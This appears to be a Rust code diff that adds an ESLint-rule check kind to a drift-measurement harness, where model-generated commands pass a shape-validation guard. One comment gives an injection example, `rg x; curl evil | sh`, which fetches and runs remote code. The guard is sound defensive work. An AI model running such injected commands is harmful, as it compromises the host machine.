@@ -53,6 +53,15 @@ pub(super) enum HarnessCheckKind {
     /// so it never runs (and so a `rg` exit-1 "no matches" can't be mistaken for a gate
     /// failure). A model-generated `command`, so the arm gate shape-validates it.
     Shell,
+    /// Drift-v2 (#279): a GENERATED ESLint rule the EnforceRun executes with
+    /// `--format json --stats` to count a convention's violating sites. Distinct from
+    /// [`HarnessCheckKind::LintPlugin`] (a hand-authored whole-plugin GATE): this is a
+    /// per-convention drift MEASUREMENT attributed to one rule id. `--stats` is what makes
+    /// it fail-visible — its per-file `times.passes[].rules` map names every rule that
+    /// actually RAN, so "the rule is not wired into this repo's config" can never be
+    /// mistaken for "the rule ran and found nothing" (see [`super::drift`]). Its `command`
+    /// is model-generated, so the arm gate shape-validates it (`super::command_guard`).
+    EslintRule,
 }
 
 /// The wire kinds a Structure-Lock check may be ARMED / edited as — every kind the
@@ -71,10 +80,12 @@ pub(crate) const ARMABLE_CHECK_KINDS: &[&str] = &[
     "mutation-score",
     "ast-grep",
     "api-extractor",
-    // Drift-v1 (T15) substrates. Their `command` is model-generated, so the arm gate
-    // additionally shape-validates it (`super::command_guard::validate_check_command`).
+    // Drift-v1 (T15) + Drift-v2 (#279) substrates. Their `command` is model-generated, so
+    // the arm gate additionally shape-validates it
+    // (`super::command_guard::validate_check_command`).
     "lint-meta",
     "shell",
+    "eslint-rule",
 ];
 
 /// The Drift-v1 substrate kinds whose `command` is MODEL-GENERATED (compiled by the
@@ -82,7 +93,7 @@ pub(crate) const ARMABLE_CHECK_KINDS: &[&str] = &[
 /// manifest — an injected proposal could be `rg x; curl evil | sh`. Every other kind's
 /// command is hand-authored in the trusted UI. Greppable single source of truth for
 /// [`super::command_guard::validate_check_command`]'s applicability.
-pub(crate) const MODEL_GENERATED_COMMAND_KINDS: &[&str] = &["lint-meta", "shell"];
+pub(crate) const MODEL_GENERATED_COMMAND_KINDS: &[&str] = &["lint-meta", "shell", "eslint-rule"];
 
 /// Whether `kind` is a runnable/armable Structure-Lock check kind (exact,
 /// case-sensitive — wire kinds are kebab-case and a near-miss would arm a check
@@ -108,15 +119,20 @@ impl HarnessCheckKind {
             HarnessCheckKind::ApiExtractor => "api-extractor",
             HarnessCheckKind::LintMeta => "lint-meta",
             HarnessCheckKind::Shell => "shell",
+            HarnessCheckKind::EslintRule => "eslint-rule",
         }
     }
 
-    /// Whether this kind is a Drift-v1 (T15) substrate — a check an EnforceRun measures
-    /// for site-count drift (lint-meta via the `--json` reporter; shell/ripgrep counts).
-    /// The greppable classifier [`super::drift`] uses to decide which armed checks yield
-    /// a `ConventionDrift` record.
+    /// Whether this kind is a DRIFT substrate — a check an EnforceRun measures for
+    /// site-count drift (lint-meta via the `--json` reporter, an ESLint rule via
+    /// `--format json --stats`; shell/ripgrep counts once #187 lands). The greppable
+    /// classifier [`super::drift`] uses to decide which armed checks yield a
+    /// `ConventionDrift` record.
     pub(super) fn is_drift_substrate(self) -> bool {
-        matches!(self, HarnessCheckKind::LintMeta | HarnessCheckKind::Shell)
+        matches!(
+            self,
+            HarnessCheckKind::LintMeta | HarnessCheckKind::Shell | HarnessCheckKind::EslintRule
+        )
     }
 
     /// Security-critical kinds are EXCLUDED from the runner's flaky-retry policy once a
